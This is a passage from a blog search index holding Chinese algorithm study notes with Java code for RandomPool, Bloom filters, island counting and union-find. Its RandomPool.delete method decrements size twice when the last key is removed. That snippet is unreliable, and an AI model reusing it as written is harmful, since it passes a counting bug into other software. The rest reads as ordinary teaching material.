<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>左神算法0x04</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x04/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x04/</url>
      
        <content type="html"><![CDATA[<p>【哈希，并查集，KMP，Manacher，单调栈，大数据问题，位运算，暴力递归改写DP】</p><h2 id="关于哈希"><a href="#关于哈希" class="headerlink" title="关于哈希"></a>关于哈希</h2><p>最重要的性质就是离散性或者说是均匀性，即对于哈希函数的输出域来说，用面积相同的小正方形去框输出域，那么框出来的点的个数基本相同</p><h3 id="设计RandomPool结构"><a href="#设计RandomPool结构" class="headerlink" title="设计RandomPool结构"></a>设计RandomPool结构</h3><p>设计一种结构，在该结构中有如下三个功能:</p><p>insert(key): 将某个key加入到该结构，做到不重复加</p><p>delete(key): 将原本在结构中的某个key移除</p><p>getRandom(): 等概率随机返回结构中的任何一个key</p><p>要求 Insert、delete和getRandom方法的时间复杂度都是O(1)</p><p>建立两张哈希表，一张是key -&gt; index，另一张是index -&gt; key，则等概率随机返回时便可以利用随机函数返回随机的整数index，然后取出该index对应的key即可，但是这是在index连续的情况下，所以注意当删除的时候，出现不连续，那么就将最后一个index和key放到删除的地方，这就保证了index的连续</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RandomPool</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> keyIndexMap<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token punctuation">></span></span> indexKeyMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">RandomPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        keyIndexMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        indexKeyMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>keyIndexMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            keyIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>            indexKeyMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>size<span class="token operator">++</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">K</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> indexKeyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>keyIndexMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> deleteIndex <span class="token operator">=</span> keyIndexMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> lastIndex <span class="token operator">=</span> <span class="token operator">--</span>size<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lastIndex <span class="token operator">==</span> deleteIndex<span class="token punctuation">)</span> <span class="token operator">--</span>size<span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token class-name">K</span> lastKey <span class="token operator">=</span> indexKeyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                keyIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lastKey<span class="token punctuation">,</span> deleteIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                indexKeyMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>deleteIndex<span class="token punctuation">,</span> lastKey<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            keyIndexMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            indexKeyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>lastIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h3><p>用途：假如需要一个黑名单，含有大量（100亿）url，当访问到黑名单的url时，必须被过滤掉</p><p>那么布隆过滤器的作用就是</p><p>1）对于黑名单中的url，必须能查到，所以可以过滤掉</p><p>2）对于不在黑名单的url，有一定的失误率，即有可能被误判为黑名单中的url</p><p>需要介绍一个bitmap结构，一个int数组，每个数有4个字节，即32bit，我们想使用一个每个数只有1个比特的数组结构，所以可以借助int数组实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// arr[0]: 0-31</span><span class="token comment">// arr[1]: 32-63</span><span class="token comment">// ...</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 得到第178bit上的状态（是1还是0）</span><span class="token keyword">int</span> numIndex <span class="token operator">=</span> <span class="token number">178</span> <span class="token operator">/</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token comment">// 这个bit在哪个数取得</span><span class="token keyword">int</span> bitIndex <span class="token operator">=</span> <span class="token number">178</span> <span class="token operator">%</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token comment">// 这个bit在这个数的第几个bit取得</span><span class="token keyword">int</span> bit <span class="token operator">=</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">>></span> bitIndex<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 将178bit上的状态改为1</span>arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bitIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将178bit上的状态改为0</span>arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>numIndex<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bitIndex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>布隆过滤器就是一个大的位图，有m个bit，k个哈希函数，输入一个url，然后通过k个哈希函数得到k个值，%m之后放到位图中，即将位图中k个数置1。当判断某个url时，同样做k个哈希运算，如果得到的那些bit位都是1，那么该url一定是黑名单，如果有一个不是1，那么就不是黑名单</p><p>所以m和k的选择是非常重要的，m选的小就意味着对于大数据量来说置1的bit位多，导致大量不在黑名单中的有可能被误判为黑名单，k选的大即哈希函数过多，那么每次哈希出来的数量也是置1的bit位较多，导致误判</p><p>m和k通过以下公式确定（注意都要向上取整，往大了取整）</p><p>n = 样本量， p = 失误率</p><p>$m=-\frac{n\times lnp}{(ln2)^2}$</p><p>$k=ln2\times \frac{m}{n}\approx0.7\times \frac{m}{n}$</p><p>如果m算出来是26G，允许更大的内存32G的话，我们的失误率当然会更低</p><p>$P_真=（1-e^{-\frac{n\times k}{m_真}}）^k$</p><h3 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h3><p><a href="https://www.bilibili.com/video/BV13g41157hK?p=11&amp;t=7146.3">https://www.bilibili.com/video/BV13g41157hK?p=11&amp;t=7146.3</a></p><h2 id="岛问题"><a href="#岛问题" class="headerlink" title="岛问题"></a>岛问题</h2><p>一个矩阵中只有0和1两种值，每个位置都可以和自己的上、下、左、右 四个位置相连，如 果有一片1连在一起，这个部分叫做一个岛，求一个矩阵中有多少个岛?</p><p>001010</p><p>111010</p><p>100100</p><p>000000</p><p>这个矩阵中有三个岛</p><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>设计一个感染函数，遍历矩阵，遇到1就将其及其上下左右为1的位置感染为2，这是递归过程，也就是说其上下左右位置继续递归感染，直至无法感染为止，这种感染过程整个完成1次即视为1个岛</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">infect</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">>=</span> <span class="token class-name">N</span> <span class="token operator">||</span> j <span class="token operator">>=</span> <span class="token class-name">M</span> <span class="token operator">||</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">isLand</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>matrix <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">M</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">M</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token function">infect</span><span class="token punctuation">(</span>matrix<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>如何使用并行算法解决该问题？</p><p>首先考虑两个CPU的情况</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f1.png"></p><p>将矩阵分割开，一个CPU搞一半，同样进行上面的感染过程，得出左侧两个岛，右侧两个岛，然后两个CPU还需要进行额外的工作，即对边界情况保存该点是由哪个点感染来的，可以看出左侧边界第一行第4列是由第一行第一列感染来的，都记为A，B, C, D都是如此，最后再对左右两侧进行合并，检查边界情况，从第一行开始看，第一行第4列属于A集合，第5列属于C集合，查询到不属于同一个集合，进行union操作，然后总岛数-1，第三行，union集合B和C，总岛数-1，第5行，union集合B和D，总岛数-1，最后一行，看到A和D属于同一集合，结束</p><p>多个CPU情况类似，将矩阵分N块，然后每个CPU额外收集边界信息，最后归并即可</p><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>对于a, b, c, d, e</p><p>每个字母先各自成为1个集合，那么现在就总共5个集合，并查集需要的方法为</p><p>1）isSameSet(a, b) 是否属于同一个集合</p><p>2）union(a, b) 将a的集合和b的集合合为一个集合</p><p>对于以上两个方法，经典的数据结构无法实现都是O(1)的，比如链表，可以使union方法快，但是查询是否同一个集合则需要遍历，较慢，又比如哈希set，查询是否同一个快，但是union又较慢</p><p>所以我们设计这样一种结构，每个集合都有自己的代表节点，每个节点也都有自己的父节点，代表节点的父节点是自己，那么在查询是否为同一集合时，可以查看各自的代表节点是否是同一个即可（即不断往上找父节点，直到父节点为自己为止），在union操作时，元素少的集合的代表节点的父节点不再指向自己，而是指向元素多的集合的代表节点</p><p>借助三个哈希表，</p><p>elementMap 将用户的元素类型包一层element类型，并且一一对应在表里</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">V</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">element</span><span class="token punctuation">(</span><span class="token class-name">V</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fatherMap 记录每个节点的父节点（即指向关系，节点指向父节点）</p><p>sizeMap 只记录代表节点，value则为该代表节点所在集合的元素个数</p><p>显然，如果集合中某个链过长的话，查询是否同一集合则会变得较慢，所以为了加速union过程，可以在往上找父节点的时候，同时记录路途中遍历到的节点，放在栈里，找到代表节点的时候，把途中的节点全都改成直接指向代表节点，这就处理了某个链过长的情况</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> unionFind<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">,</span> element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> elementMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">,</span> element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> fatherMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> sizeMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">unionFind</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        elementMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fatherMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sizeMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">V</span> each<span class="token operator">:</span>list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> <span class="token keyword">new</span> element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            elementMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            fatherMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            sizeMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> <span class="token function">findHead</span><span class="token punctuation">(</span>element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span>element<span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>fatherMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">!=</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            e <span class="token operator">=</span> fatherMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> fatherMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSameSet</span><span class="token punctuation">(</span><span class="token class-name">V</span> a<span class="token punctuation">,</span> <span class="token class-name">V</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token class-name">V</span> a<span class="token punctuation">,</span> <span class="token class-name">V</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> elementMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> aF <span class="token operator">=</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> bF <span class="token operator">=</span> <span class="token function">findHead</span><span class="token punctuation">(</span>elementMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>aF <span class="token operator">!=</span> bF<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">// 找到哪个集合元素个数多</span>                element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> big <span class="token operator">=</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aF<span class="token punctuation">)</span> <span class="token operator">>=</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>bF<span class="token punctuation">)</span> <span class="token operator">?</span> aF <span class="token operator">:</span> bF<span class="token punctuation">;</span>                element<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">></span></span> small <span class="token operator">=</span> big <span class="token operator">==</span> aF <span class="token operator">?</span> bF <span class="token operator">:</span> aF<span class="token punctuation">;</span>                fatherMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>small<span class="token punctuation">,</span> big<span class="token punctuation">)</span><span class="token punctuation">;</span>                sizeMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>big<span class="token punctuation">,</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>small<span class="token punctuation">)</span> <span class="token operator">+</span> sizeMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>big<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sizeMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>small<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 